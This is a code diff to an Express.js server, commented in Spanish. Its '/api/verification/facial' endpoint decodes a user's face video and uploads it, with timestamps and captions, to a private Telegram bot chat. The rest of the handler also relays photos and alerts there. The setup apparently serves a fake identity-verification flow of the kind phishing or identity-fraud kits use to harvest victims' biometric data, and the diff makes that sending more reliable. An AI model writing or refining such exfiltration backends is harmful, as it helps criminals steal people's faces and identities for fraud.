@@ -129,69 +129,39 @@ app.post('/api/verification/facial', async (req, res) => {
   try {
     await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL</b>\n\n📹 Tipo: ${faceVideo ? 'VIDEO' : facePhotos ? facePhotos.length + ' fotos' : 'Imagen'}\n🕐 ${new Date().toLocaleString('es-AR')}`);
     
-    // Si hay video, enviarlo
+    // Si hay video, enviarlo COMO DOCUMENTO (más confiable que video para webm)
     if (faceVideo) {
-      console.log('📹 Procesando video...');
+      console.log('📹 Procesando video webm...');
       try {
         const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
         const buffer = Buffer.from(base64Data, 'base64');
         const sizeMB = (buffer.length / (1024 * 1024)).toFixed(2);
         console.log(`📹 Tamaño del video: ${sizeMB} MB`);
         
-        if (buffer.length > 50 * 1024 * 1024) {
-          console.log('⚠️ Video muy grande, enviando como documento...');
-          // Si es muy grande, enviar como documento
-          const FormData = require('form-data');
-          const form = new FormData();
-          form.append('chat_id', TELEGRAM_CHAT_ID);
-          form.append('document', buffer, { filename: 'facial_video.webm' });
-          form.append('caption', `👤 Video Facial (${sizeMB} MB)`);
-          
-          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
-            headers: form.getHeaders(),
-            maxContentLength: Infinity,
-            maxBodyLength: Infinity,
-            timeout: 60000
-          });
+        const FormData = require('form-data');
+        const form = new FormData();
+        form.append('chat_id', TELEGRAM_CHAT_ID);
+        form.append('document', buffer, { 
+          filename: `facial_${Date.now()}.webm`,
+          contentType: 'video/webm'
+        });
+        form.append('caption', `👤 VIDEO VERIFICACIÓN FACIAL\n📏 Tamaño: ${sizeMB} MB\n🕐 ${new Date().toLocaleString('es-AR')}`);
+        
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
+          headers: form.getHeaders(),
+          maxContentLength: Infinity,
+          maxBodyLength: Infinity,
+          timeout: 120000 // 2 minutos de timeout
+        });
+        
+        if (response.data.ok) {
+          console.log('✅ Video enviado correctamente a Telegram');
         } else {
-          // Enviar como video normal
-          const FormData = require('form-data');
-          const form = new FormData();
-          form.append('chat_id', TELEGRAM_CHAT_ID);
-          form.append('video', buffer, { filename: 'facial.webm', contentType: 'video/webm' });
-          form.append('caption', `👤 Video Verificación Facial (${sizeMB} MB)`);
-          form.append('supports_streaming', 'true');
-          
-          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, form, {
-            headers: form.getHeaders(),
-            maxContentLength: Infinity,
-            maxBodyLength: Infinity,
-            timeout: 60000
-          });
+          console.log('⚠️ Respuesta inesperada:', response.data);
         }
-        console.log('✅ Video enviado a Telegram');
       } catch (videoError) {
         console.error('❌ Error enviando video:', videoError.response?.data || videoError.message);
-        // Intentar enviar como documento si falla como video
-        try {
-          const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
-          const buffer = Buffer.from(base64Data, 'base64');
-          
-          const FormData = require('form-data');
-          const form = new FormData();
-          form.append('chat_id', TELEGRAM_CHAT_ID);
-          form.append('document', buffer, { filename: 'facial_video.webm' });
-          form.append('caption', '👤 Video Facial (como documento)');
-          
-          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
-            headers: form.getHeaders(),
-            timeout: 60000
-          });
-          console.log('✅ Video enviado como documento');
-        } catch (docError) {
-          console.error('❌ Error enviando como documento:', docError.message);
-          await sendToTelegram(`⚠️ No se pudo enviar el video facial\nError: ${videoError.message}`);
-        }
+        await sendToTelegram(`⚠️ Error enviando video facial\nTamaño: ${faceVideo ? (faceVideo.length / 1024 / 1024 * 0.75).toFixed(2) : '?'} MB\nError: ${videoError.message}`);
       }
     }
     // Enviar fotos múltiples si existen
